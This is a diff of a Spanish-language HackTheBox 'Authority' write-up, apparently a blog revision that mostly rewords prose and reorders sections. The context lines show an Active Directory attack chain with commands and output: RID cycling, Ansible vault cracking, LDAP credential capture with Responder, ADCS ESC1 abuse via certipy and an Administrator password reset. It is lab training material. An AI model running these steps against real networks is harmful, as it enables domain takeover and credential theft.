@@ -2,11 +2,13 @@
 title: "HackTheBox Machine - Authority"
 date: 2026-02-11 20:00:00 -0600
 categories: [Writeups, HachTheBox]
-tags: [HTB Easy Machines, Active Directory, SeMachineAccountPrivilege, ESC1, nmap, dig, netexec, smbmap, smbclient, ansible2john, ansible-vault, evil-winrm-py, responder, certipy-ad, impacket-lookupsid, impacket-addcomputer]
+tags: [HTB Easy Machines, Active Directory, SeMachineAccountPrivilege, ESC1, nmap, dig, netexec, smbmap, smbclient, ansible2john, ansible-vault, evil-winrm-py, responder, certipy-ad, impacket-lookupsid, impacket-addcomputer, SMB, WirRM, HTTP, LDAP]
 ---
 
 
-### TCP Scan
+## TCP Scan
+
+Empezaré escaneando puertos con `nmap` del puerto 1 al 65535.. 
 
 ```shell
 ❯ nmap -p 1-65535 -sS -n -Pn --min-rate 5000 10.129.12.201 -oN TCPPorts
@@ -49,14 +51,16 @@ PORT      STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 19.61 seconds
 ```
 
-### Filtering Open Ports
+## Filtering Open Ports
+
+Filtraré los puertos abiertos para facilitar la enumeración de servicios y versiones.
 
 ```shell
 ❯ grep "open" TCPPorts | cut -d ' ' -f1 | cut -d '/' -f1 | xargs | tr ' ' ','
 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49673,49690,49691,49693,49694,49702,49710,51693,54876
 ```
 
-### TCP Services Scan
+## TCP Services Scan
 
 ```shell
 ❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49673,49690,49691,49693,49694,49702,49710,51693,54876 -n -Pn --min-rate 5000 10.129.12.201 -oN TCPServices
@@ -149,7 +153,7 @@ El escaneo arroja varios dominios: `authority.htb`, `authority.htb.corp` y `htb.
 10.129.12.201 authority.htb authority.htb.corp htb.corp
 ```
 
-## 53/TCP|UDP - DNS (Domain Name Server
+## 53/TCP|UDP - DNS (Domain Name Server)
 
 Probando transferencia de zona me devuelve una transferencia fallida.
 
@@ -164,7 +168,7 @@ Probando transferencia de zona me devuelve una transferencia fallida.
 
 ## 445/TCP - SMB (Server Message Block)
 
-Cuento con una null session sobre SMB, esto me va permitir enumerar usuarios locales del sistema y archvios compartidos. 
+Al no contar con credenciales, suelo probar una credenciales de `Invitado (Guest)` o una `null session`.
 
 ```shell
 ❯ netexec smb authority.htb.corp -u guest -p ''
@@ -172,57 +176,9 @@ SMB         10.129.12.201   445    AUTHORITY        [*] Windows 10 / Server 2019
 SMB         10.129.12.201   445    AUTHORITY        [+] authority.htb\\guest: 
 ```
 
-### RID Cycling Attack
-
-Antes de listar archivos compartidos, realizo un `RID Cycling Attack` para enumerar grupos y usuarios, esto me puede facilitar la explotación posteriormente.
-
-```shell
-❯ netexec smb authority.htb.corp -u guest -p '' --rid-brute
-SMB         10.129.12.201   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) 
-SMB         10.129.12.201   445    AUTHORITY        [+] authority.htb\\guest: 
-SMB         10.129.12.201   445    AUTHORITY        498: HTB\\Enterprise Read-only Domain Controllers (SidTypeGroup)
-SMB         10.129.12.201   445    AUTHORITY        500: HTB\\Administrator (SidTypeUser)
-SMB         10.129.12.201   445    AUTHORITY        501: HTB\\Guest (SidTypeUser)
-SMB         10.129.12.201   445    AUTHORITY        502: HTB\\krbtgt (SidTypeUser)
-SMB         10.129.12.201   445    AUTHORITY        512: HTB\\Domain Admins (SidTypeGroup)
-SMB         10.129.12.201   445    AUTHORITY        513: HTB\\Domain Users (SidTypeGroup)
-SMB         10.129.12.201   445    AUTHORITY        514: HTB\\Domain Guests (SidTypeGroup)
-SMB         10.129.12.201   445    AUTHORITY        515: HTB\\Domain Computers (SidTypeGroup)
-SMB         10.129.12.201   445    AUTHORITY        516: HTB\\Domain Controllers (SidTypeGroup)
-SMB         10.129.12.201   445    AUTHORITY        517: HTB\\Cert Publishers (SidTypeAlias)
-SMB         10.129.12.201   445    AUTHORITY        518: HTB\\Schema Admins (SidTypeGroup)
-SMB         10.129.12.201   445    AUTHORITY        519: HTB\\Enterprise Admins (SidTypeGroup)
-SMB         10.129.12.201   445    AUTHORITY        520: HTB\\Group Policy Creator Owners (SidTypeGroup)
-SMB         10.129.12.201   445    AUTHORITY        521: HTB\\Read-only Domain Controllers (SidTypeGroup)
-SMB         10.129.12.201   445    AUTHORITY        522: HTB\\Cloneable Domain Controllers (SidTypeGroup)
-SMB         10.129.12.201   445    AUTHORITY        525: HTB\\Protected Users (SidTypeGroup)
-SMB         10.129.12.201   445    AUTHORITY        526: HTB\\Key Admins (SidTypeGroup)
-SMB         10.129.12.201   445    AUTHORITY        527: HTB\\Enterprise Key Admins (SidTypeGroup)
-SMB         10.129.12.201   445    AUTHORITY        553: HTB\\RAS and IAS Servers (SidTypeAlias)
-SMB         10.129.12.201   445    AUTHORITY        571: HTB\\Allowed RODC Password Replication Group (SidTypeAlias)
-SMB         10.129.12.201   445    AUTHORITY        572: HTB\\Denied RODC Password Replication Group (SidTypeAlias)
-SMB         10.129.12.201   445    AUTHORITY        1000: HTB\\AUTHORITY$ (SidTypeUser)
-SMB         10.129.12.201   445    AUTHORITY        1101: HTB\\DnsAdmins (SidTypeAlias)
-SMB         10.129.12.201   445    AUTHORITY        1102: HTB\\DnsUpdateProxy (SidTypeGroup)
-SMB         10.129.12.201   445    AUTHORITY        1601: HTB\\svc_ldap (SidTypeUser)
-```
-
-Filtrando la información almacenando los usuarios dentro de mi diccionario `users`.
-
-```shell
-❯ grep "SidTypeUser" sidusers | tr -s ' ' | cut -d ' ' -f6 | cut -d '\\' -f2
-Administrator
-Guest
-krbtgt
-AUTHORITY$
-svc_ldap
-
-❯ grep "SidTypeUser" sidusers | tr -s ' ' | cut -d ' ' -f6 | cut -d '\\' -f2 > users
-```
-
 ### SMB Shares
 
-Buscando archivos compartidos se observa una carpeta inusual llamada “Development”.
+Enumerando los compartidos se observa una carpeta inusual llamada “Development”.
 
 ```shell
 ❯ netexec smb authority.htb.corp -u guest -p '' --shares
@@ -239,6 +195,7 @@ SMB         10.129.12.201   445    AUTHORITY        IPC$            READ        
 SMB         10.129.12.201   445    AUTHORITY        NETLOGON                        Logon server share 
 SMB         10.129.12.201   445    AUTHORITY        SYSVOL                          Logon server share 
 ```
+Igualmente se pueden enumerar los comparitos con `smbmap`.
 
 ```shell
 ❯ smbmap -H 10.129.229.56 -u guest -p ''
@@ -270,7 +227,8 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
 [*] Closed 1 connections
 ```
 
-```python
+
+```shell
 ❯ smbclient \\\\\\\\authority.htb.corp\\\\Development -U "guest%"
 Try "help" to get a list of possible commands.
 smb: \\> ls
@@ -298,7 +256,7 @@ smb: \\Automation\\Ansible\\> ls
 
 ### Download Recursively SMB Files
 
-Como son muchos archivos lo que hay que inspeccionar, haré una descarga recursiva de todo el compartido.
+Indagando entre las carpetas, me doy cuenta que son muchos archivos, sin embargo, desde la consola de `smbclient` hay una manera de descargar todos los archivos recursivamente de un recurso compartido.
 
 ```shell
 ❯ smbclient \\\\\\\\authority.htb.corp\\\\Development -U "guest%"
@@ -363,9 +321,53 @@ getting file \\Automation\\Ansible\\ADCS\\molecule\\default\\molecule.yml of siz
 getting file \\Automation\\Ansible\\ADCS\\molecule\\default\\prepare.yml of size 371 as Automation/Ansible/ADCS/molecule/default/prepare.yml (0.9 KiloBytes/sec) (average 3.5 KiloBytes/sec)
 ```
 
-### Looking for Credentials
+## RID Cycling Attack
 
-Teniendo que revisar muchos archivos, filtro por palabras clave que me lleven hacia una potencial credendial almacenada.
+Antes de continuar, quiero conocer los usuarios locales de la máquina, efectuando un `RID Cycling Attack` puedo listar RIDs y usuarios, y posteriormente almacenarlos en un diccionario `users`.
+
+```shell
+❯ netexec smb authority.htb.corp -u guest -p '' --rid-brute
+SMB         10.129.12.201   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) 
+SMB         10.129.12.201   445    AUTHORITY        [+] authority.htb\\guest: 
+SMB         10.129.12.201   445    AUTHORITY        498: HTB\\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.12.201   445    AUTHORITY        500: HTB\\Administrator (SidTypeUser)
+SMB         10.129.12.201   445    AUTHORITY        501: HTB\\Guest (SidTypeUser)
+SMB         10.129.12.201   445    AUTHORITY        502: HTB\\krbtgt (SidTypeUser)
+SMB         10.129.12.201   445    AUTHORITY        512: HTB\\Domain Admins (SidTypeGroup)
+SMB         10.129.12.201   445    AUTHORITY        513: HTB\\Domain Users (SidTypeGroup)
+SMB         10.129.12.201   445    AUTHORITY        514: HTB\\Domain Guests (SidTypeGroup)
+SMB         10.129.12.201   445    AUTHORITY        515: HTB\\Domain Computers (SidTypeGroup)
+SMB         10.129.12.201   445    AUTHORITY        516: HTB\\Domain Controllers (SidTypeGroup)
+SMB         10.129.12.201   445    AUTHORITY        517: HTB\\Cert Publishers (SidTypeAlias)
+SMB         10.129.12.201   445    AUTHORITY        518: HTB\\Schema Admins (SidTypeGroup)
+SMB         10.129.12.201   445    AUTHORITY        519: HTB\\Enterprise Admins (SidTypeGroup)
+SMB         10.129.12.201   445    AUTHORITY        520: HTB\\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.129.12.201   445    AUTHORITY        521: HTB\\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.12.201   445    AUTHORITY        522: HTB\\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.129.12.201   445    AUTHORITY        525: HTB\\Protected Users (SidTypeGroup)
+SMB         10.129.12.201   445    AUTHORITY        526: HTB\\Key Admins (SidTypeGroup)
+SMB         10.129.12.201   445    AUTHORITY        527: HTB\\Enterprise Key Admins (SidTypeGroup)
+SMB         10.129.12.201   445    AUTHORITY        553: HTB\\RAS and IAS Servers (SidTypeAlias)
+SMB         10.129.12.201   445    AUTHORITY        571: HTB\\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.12.201   445    AUTHORITY        572: HTB\\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.12.201   445    AUTHORITY        1000: HTB\\AUTHORITY$ (SidTypeUser)
+SMB         10.129.12.201   445    AUTHORITY        1101: HTB\\DnsAdmins (SidTypeAlias)
+SMB         10.129.12.201   445    AUTHORITY        1102: HTB\\DnsUpdateProxy (SidTypeGroup)
+SMB         10.129.12.201   445    AUTHORITY        1601: HTB\\svc_ldap (SidTypeUser)
+
+❯ grep "SidTypeUser" sidusers | tr -s ' ' | cut -d ' ' -f6 | cut -d '\\' -f2
+Administrator
+Guest
+krbtgt
+AUTHORITY$
+svc_ldap
+
+❯ grep "SidTypeUser" sidusers | tr -s ' ' | cut -d ' ' -f6 | cut -d '\\' -f2 > users
+```
+
+## Looking for Credentials
+
+Teniendo que revisar muchos archivos, filtro por palabras clave que me lleven hacia una credendial almacenada.
 
 ```shell
 ❯ grep -Eir "pass|password|ansible|cred"
@@ -455,7 +457,7 @@ Ansible/LDAP/.travis.yml:  - echo "$VAULT_PASSWORD" > .vault_password
 Ansible/LDAP/.travis.yml:  - ansible-playbook tests/travis.yml -i localhost, --vault-password-file .vault_password --syntax-check
 ```
 
-Recibo mucho output, mejor filtro por archivos que contengan estas palabras clave.
+Recibo mucho output, filtraré por archivos que contengan estas palabras clave.
 
 ```shell
 ❯ grep -Eir "pass|password|cred" -l
@@ -484,7 +486,7 @@ Ansible/LDAP/templates/sssd.conf.j2
 Ansible/LDAP/.travis.yml
 ```
 
-Checando uno por uno:
+Al inspeccionar los archivos:
 
 **Ansible/PWM/defaults/main.yml**
 
@@ -525,9 +527,9 @@ ldap_admin_password: !vault |
           3764      
 ```
 
-### Cracking Ansible Hashes
+## Cracking Ansible Hashes
 
-Se pueden observar multiples hashes ANSIBLE_VAULT AES256, JohnTheRipper tiene una herramienta para pasar de ansible a john, su sintaxis es:
+Se observan multiples hashes ANSIBLE_VAULT AES256, `JohnTheRipper` tiene una herramienta que permite convertir este formato a un hash creackeable.
 
 ```shell
 ❯ ansible2john
@@ -567,7 +569,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
-### Decrypting ANSIBLE_VAULT
+## Decrypting ANSIBLE_VAULT
 
 
 **pwm_admin_login.hash.yml**
@@ -634,7 +636,7 @@ svc_ldap:DevT3st@123
 svc_pwm:pWm_@dm!N_!23
 ```
 
-La credencial para LDAP no es valida, y el ususario `svc_pwm` tiene rol de `Guest`.
+Las credenciales para LDAP no es valida, además, el usuario `svc_pwm` tiene rol de `Invitado (Guest)`.
 
 ```shell
 ❯ netexec ldap authority.htb.corp -u 'svc_ldap' -p 'DevT3st@123'
@@ -663,7 +665,7 @@ pwm_admin_login:svc_pwm
 pwm_admin_password:pWm_@dm!N_!23
 ```
 
-#### https://authority.htb.corp:8443/pwm/private/login
+### https://authority.htb.corp:8443/pwm/private/login
 
 ![Desktop View](/assets/img/samples/htb-authority-machine/authoritypwmprivatelogin.png){: w="1280" h="720" }
 
@@ -673,13 +675,13 @@ Probando la credencial de `svc_pwm` resulta en error.
 
 ![Desktop View](/assets/img/samples/htb-authority-machine/authorityerrordirectory.png){: w="500" h="300"}
 
-#### https://authority.htb.corp:8443/pwm/private/config/login
+### https://authority.htb.corp:8443/pwm/private/config/login
 
 En Configuration Editor pide ingresar la Configuration Password, intentando la credencial de `svc_pwm` logro acceder a un panel de configuracion.
 
 ![Desktop View](/assets/img/samples/htb-authority-machine/authorityconfiglogin.png)
 
-#### https://authority.htb.corp:8443/pwm/private/config/editor
+### https://authority.htb.corp:8443/pwm/private/config/editor
 
 A mano izquierda se observan varios modulos: `Default Settings`, `Configuration Notes`, `LDAP`, `Modules`, `Policies`, `Settings`, y `Display Text`
 
@@ -689,11 +691,11 @@ Entre estos modulos hay 2 que llaman la atencion, `LDAP` y `Settings`, en `LDAP`
 
 ![Desktop View](/assets/img/samples/htb-authority-machine/authorityldapconfigure.png)
 
-Clickeando sobre Test LDAP Profile arroja un WARN donde dice que no se ha podido establecer una conexión con ldaps://authority.authority.htb:636, además menciona al final “unable to find a valid certification path to requested target”, probablemente el servidor esta manejando certificados.
+Clickeando sobre Test LDAP Profile arroja un WARN diciendo que no se ha podido establecer una conexión con ldaps://authority.authority.htb:636, además menciona al final “unable to find a valid certification path to requested target”, probablemente el servidor esta manejando certificados.
 
 ![Desktop View](/assets/img/samples/htb-authority-machine/authorityprofiledefault.png){: w="500" h="300"}
 
-La idea en este punto es capturar las credenciales que el servidor web está manejando, ya que en el Warning anterior, el servidor solicita una conexión por LDAP como el usuario `svc_ldap` , probablemente cada vez que se quiere conectar a ldaps://authority.authority.htb:636 mandar la credencial en texto claro o en su defecto encriptada, para esto, `responder` puede echar una mano creando un servidor LDAP falso.
+La idea en este punto es capturar las credenciales que el servidor web está alojando, ya que en el Warning anterior, el servidor solicita una conexión por LDAP como el usuario `svc_ldap` , puede que cada vez que se quiere conectar a ldaps://authority.authority.htb:636 manda la credencial en texto claro o en su defecto encriptada, para esto, `responder` puede echar una mano creando un servidor LDAP falso.
 
 ```shell
 ❯ responder -I tun0
@@ -824,8 +826,9 @@ svc_ldap
 svc_pwm
 ```
 
-La crendencial `svc_ldap:lDaP_1n_th3_cle4r!` es valida en en SMB y WinRM.
+Las crendenciales `svc_ldap:lDaP_1n_th3_cle4r!` son validas sobre SMB y WinRM.
 
+```shell
 ❯ netexec smb authority.htb.corp -u users -p 'lDaP_1n_th3_cle4r!'
 SMB         10.129.13.44    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) 
 SMB         10.129.13.44    445    AUTHORITY        [-] authority.htb\\Administrator:lDaP_1n_th3_cle4r! STATUS_LOGON_FAILURE 
@@ -834,8 +837,6 @@ SMB         10.129.13.44    445    AUTHORITY        [-] authority.htb\\krbtgt:lD
 SMB         10.129.13.44    445    AUTHORITY        [-] authority.htb\\AUTHORITY$:lDaP_1n_th3_cle4r! STATUS_LOGON_FAILURE 
 SMB         10.129.13.44    445    AUTHORITY        [+] authority.htb\\svc_ldap:lDaP_1n_th3_cle4r!
 
-
-```shell
 ❯ netexec winrm authority.htb.corp -u users -p 'lDaP_1n_th3_cle4r!'
 WINRM       10.129.13.44    5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
 WINRM       10.129.13.44    5985   AUTHORITY        [-] authority.htb\\Administrator:lDaP_1n_th3_cle4r!
@@ -878,9 +879,9 @@ evil-winrm-py PS C:\\Users\\svc_ldap\\Desktop> type user.txt
 
 > User Flag: 5be376cff5b4542108932ab22a57e6c5
 
-### Looking for Certificates
+## Looking for Certificates
 
-Volviendo un poco atras, se ha mencionado la implementacion de certificados en el dominio, voy a checar si efectivamente existen certificados.
+Volviendo un poco atras, se ha mencionado la implementación de certificados en el dominio, checaré si efectivamente existen certificados.
 
 
 ```shell
@@ -892,11 +893,11 @@ ADCS        10.129.229.56   389    AUTHORITY        Found PKI Enrollment Server:
 ADCS        10.129.229.56   389    AUTHORITY        Found CN: AUTHORITY-CA
 ```
 
-Encuentra un certificado llamado AUTHORITY-CA, el cual voy a utilizar posteriormente.
+Encuentra un certificado llamado AUTHORITY-CA, el cual utilizaré posteriormente.
 
-### ESC1
+## ESC1
 
-Ya que existen certificados activos en el dominio, busco vulnerabilidades realcionadas a la configuracion del certificado.
+Ya que existen certificados activos en el dominio, buscaré vulnerabilidades relacionadas a la configuración del certificado.
 
 
 ```shell
@@ -994,7 +995,7 @@ Certificate Templates
     [!] Vulnerabilities
       ESC1                              : Enrollee supplies subject and template allows client authentication.
 ```
-Para la siguiente face de explotacion necesitaré el SID del Administrador, ya sea que lo consiga por `PowerShell`:
+Necesitaré el SID del Administrador, ya sea que lo consiga por `PowerShell`:
 
 ```powershell
 evil-winrm-py PS C:\\Users\\svc_ldap\\Documents> Get-ADUser -Filter * | where { $_.SID -like “*-500” }
@@ -1057,7 +1058,7 @@ dc-ip : 10.129.229.56
 
 svc_ldap : lDaP_1n_th3_cle4r!
 ```
-Una vez contando con los datos que me pide la herramienta, mando una request. 
+Una vez contando con los datos que me pide la herramienta, mando una petición. 
 
 ```shell
 ❯ certipy-ad -debug req -u 'svc_ldap@authority.htb' -p 'lDaP_1n_th3_cle4r!' -ca AUTHORITY-CA -template 'CorpVPN' -target authority.authority.htb -upn 'Administrator@authority.htb' -sid 'S-1-5-21-622327497-3269355298-2248959698-500' -dc-host authority.htb -ns 10.129.229.56
@@ -1084,13 +1085,13 @@ Would you like to save the private key? (y/N): n
 
 Intentando esta escalada, me arroja un error: [-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
 
-### SeMachineAccountPrivilege
+## SeMachineAccountPrivilege
 
-Buscando en Google el error me encuetro con este github que explica que hacer ante este error:
+Buscando en Google el error, me encuetro con este github que explica que hacer ante este error:
 
 [https://github.com/ly4k/Certipy/issues/199](https://github.com/ly4k/Certipy/issues/199)
 
-Sugiere en agregar una computadora al dominio con `impacket-addcomputer`, sin embargo, el usuario `svc_ldap` debe de contar con el privilegio `SeMachineAccountPrivilege`, se puede comprobar por fuera y dentro de la maquina.
+Sugiere en agregar una computadora al dominio con `impacket-addcomputer`, sin embargo, el usuario `svc_ldap` debe de contar con el privilegio `SeMachineAccountPrivilege`, se puede comprobar por fuera y dentro de la máquina.
 
 ```shell
 ❯ netexec ldap authority.htb.corp -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M maq
@@ -1114,7 +1115,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
 Efectivamente existe este privilegio dentro del usuario, teniendo hasta 10 máquinas para agregar al dominio.
-Voy agregar una computadora al dominio.
+Agregaré una computadora al dominio.
 
 
 ```shell
@@ -1225,7 +1226,7 @@ Password changed successfully!
 ```
 
 Cambiada la constraseña, puedo acceder de nuevo al sistema como Administrador a travez de WinRM.
-Compruebo que se haya aplicado mi cambio de contraseña.
+Comprobaré que se haya aplicado mi cambio de contraseña.
 
 ```shell
 ❯ netexec winrm authority.htb.corp -u 'Administrator' -p 'Password123!'
